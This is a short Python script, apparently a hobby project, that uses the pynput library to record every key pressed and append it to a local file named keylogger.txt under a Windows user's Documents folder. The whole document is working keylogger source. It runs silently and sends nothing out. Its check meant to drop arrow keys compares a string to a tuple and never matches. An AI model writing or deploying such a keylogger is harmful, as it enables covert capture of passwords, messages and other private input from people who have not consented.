from pynput.keyboard import Listener

def keystroke(key):
    key = str(key).replace("'","")
    if key == ("Key.right", "Key.left", "Key.up","Key.down"):
        key = ''
    if key == "Key.enter":
        key = '\n'
    
    with open("C:/Users/asus/Documents/Project file/Temp/Keylogger/keylogger.txt", 'a') as f:
        f.write(key)

with Listener(on_press=keystroke) as l:
    l.join()
